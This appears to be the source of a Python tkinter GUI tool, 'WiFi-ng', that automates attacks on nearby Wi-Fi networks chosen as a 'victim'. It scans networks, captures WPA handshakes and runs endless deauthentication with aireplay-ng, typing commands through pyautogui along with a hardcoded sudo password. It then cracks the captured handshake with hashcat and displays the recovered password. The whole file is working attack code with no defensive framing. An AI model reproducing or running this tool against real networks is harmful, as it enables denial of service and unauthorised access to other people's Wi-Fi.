import tkinter as tk
from tkinter import *
import pyautogui
import time
from Wifi_ng import SendWiFis
from Wifi_ng import CapHand
from Wifi_ng import Deauth
import os

victim = []

class WiFiNg(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("WiFi-ng")
        self.geometry("350x150")

        # Create a frame to contain the label and buttons
        frame = tk.Frame(self)
        frame.pack()

        # Create the WiFi-ng label
        self.wifi_ng_label = tk.Label(frame, text="WiFi-ng", font=("Old English Text MT", 30, "bold"), fg="navy")
        self.wifi_ng_label.pack(pady=10)

        # Create and pack the Scan button
        self.scan_button = tk.Button(frame, text="Scan", command=self.scan, width=10)
        self.scan_button.pack(side='left', padx=10, pady=10)

        # Create and pack the Deauth button
        self.deauth_button = tk.Button(frame, text="Deauth", command=self.deauth, width=10)
        self.deauth_button.pack(side='right', padx=10, pady=10)

    def scan(self):

        def Refresh():
            networks=SendWiFis()
            x = 1
            for index in networks:
                listbox.insert(x,('                                '+index[0]+'        '+index[1]+'        '+index[2]))
                listbox.pack(fill=BOTH,expand=True)
                x+=1

        def submit():
            def gotbro():
                #Hack()
                time.sleep(1)
                pyautogui.hotkey("alt","tab")
                time.sleep(1)
                pyautogui.hotkey("ctrl","c")
                time.sleep(1)
                pyautogui.hotkey("alt","f4")
                time.sleep(1)
                pyautogui.hotkey("alt","tab")
                time.sleep(1)
                pyautogui.hotkey("ctrl","c")
                time.sleep(1)
                pyautogui.hotkey("alt","f4")
                window1.destroy()
                window.destroy()
                os.system("hcxpcapngtool -o Projects/WiFi-ng/Handshakes/catcomp.hc22000 Projects/WiFi-ng/Handshakes/*.cap")
                os.system("hashcat -w 3 -a 3 -m 22000 -i --increment-min 8 Projects/WiFi-ng/Handshakes/catcomp.hc22000 ?d?d?d?d?d?d?d?d?d?d")
                os.system("hashcat -m 22000 Projects/WiFi-ng/Handshakes/catcomp.hc22000 --show > /home/jfrans/Projects/WiFi-ng/Password.txt")
                with open("/home/jfrans/Projects/WiFi-ng/Password.txt","r") as passfile:
                    tmp = passfile.readline()
                    password = tmp[tmp.rfind(":")+1:].strip()
                window2 = tk.Tk()
                window2.geometry("350x100")
                window2.title("WiFi-ng")
                #window1.config(background="white")

                label = Label(window2,text="Password Acquired: ", font=("Old English Text MT", 20, "bold"), fg="navy")
                label.pack()
                label1 = Label(window2,text=password, font=("Old English Text MT", 14, "bold"), fg="black")
                label1.pack(pady=10)

            def Deauth1():
                Deauth(victim)
                time.sleep(1)
                pyautogui.hotkey("alt","tab")
        # def Refresh():
        #     networks=SendWiFis()
        #     x = 1
        #     for index in networks:
        #         listbox.insert(x,(index[0]+'        '+index[1]+'        '+index[2]))
        #         listbox.pack(fill=BOTH,expand=True)
        #         x+=1

            print("You have selected")
            x = listbox.get(listbox.curselection())
            global victim
            victim = x.split()
            print(x.split())
            print(type(x))
            window1 = tk.Tk()
            window1.geometry("350x100")
            window1.title("WiFi-ng")
            #window1.config(background="white")

            label = Label(window1,text="Handshake Captured? ", font=("Old English Text MT", 20, "bold"), fg="navy")
            label.pack()
            yesButton = Button(window1,text="Yes",command=gotbro,width=10)
            yesButton.pack(side="right", padx=6, pady=10)
            DaButton = Button(window1,text="Deauth",command=Deauth1, width=10)
            DaButton.pack(side="left", padx=6, pady=10)
            time.sleep(1)
            CapHand(x.split())

        print("Scanning for networks...")
        window = tk.Tk()
        window.geometry("450x400")
        window.title("WiFi-ng")
        #window.config(background="white")

        label = Label(window,text="Networks Found: ", font=("Old English Text MT", 30, "bold"), fg="navy")
        label.pack()

        listbox=Listbox(window)
        listbox.pack()
        networks=SendWiFis()
        print(networks)
        x = 1
        for index in networks:
            listbox.insert(x,('                                '+index[0]+'        '+index[1]+'        '+index[2]))
            listbox.pack(fill=BOTH,expand=True)
            x+=1

        listbox.config(height=listbox.size())
        submitButton = Button(window,text="Select",command=submit)
        # Button(window, text="submit",command=submit) and then def submit
        submitButton.pack(side='right',padx=10,pady=10)
        refreshButton = Button(window,text="Refresh",command=Refresh)
        #command = refresh
        refreshButton.pack(side='left', padx=10, pady=10)

    def deauth(self):

        def Refresh():
            networks=SendWiFis()
            x = 1
            for index in networks:
                listbox.insert(x,('                                '+index[0]+'        '+index[1]+'        '+index[2]))
                listbox.pack(fill=BOTH,expand=True)
                x+=1

        print("Deauthentificating from network...")
        window = Tk()
        window.geometry("450x400")
        window.title("WiFi-ng")
        #window.config(background="white")

        label = Label(window,text="De-Authentify", font=('Calibri',22,'bold'),fg='navy')
        label.pack()

        def start():
            x = listbox.get(listbox.curselection())
            global victim
            victim = x.split()
            startbutton.config(state=DISABLED)
            stopbutton.config(state=NORMAL)
            os.system("sudo iwconfig wlan0mon channel "+victim[1])
            pyautogui.hotkey("ctrl","alt","t")
            time.sleep(1)
            pyautogui.typewrite("sudo aireplay-ng --deauth 0 -a "+victim[0]+" wlan0mon",interval=0.08)
            pyautogui.press('enter')
            time.sleep(0.5)
            pyautogui.typewrite("7373",interval=0.08)
            pyautogui.press('enter')

        def stop():
            startbutton.config(state=NORMAL)
            stopbutton.config(state=DISABLED)
            time.sleep(1)
            pyautogui.hotkey("alt","tab")
            time.sleep(1)
            pyautogui.hotkey("ctrl","c")
            time.sleep(1)
            pyautogui.hotkey("alt","f4")

        listbox=Listbox(window)
        listbox.pack()
        networks=SendWiFis()
        print(networks)
        x = 1
        for index in networks:
            listbox.insert(x,('                                '+index[0]+'        '+index[1]+'        '+index[2]))
            listbox.pack(fill=BOTH,expand=True)
            x+=1

        listbox.config(height=listbox.size())
        startbutton = Button(window, text="Start", command=start, width=10)
        stopbutton = Button(window, text="Stop", command=stop, width=10)

        startbutton.pack(side="left", padx=10, pady=10)
        stopbutton.pack(side="right",padx=10, pady=10)
        stopbutton.config(state=DISABLED)

        refreshButton = Button(window,text="Refresh", command=Refresh, width=10)
        refreshButton.pack(padx=10, pady=10)


if __name__ == "__main__":
    app = WiFiNg()
    app.mainloop()
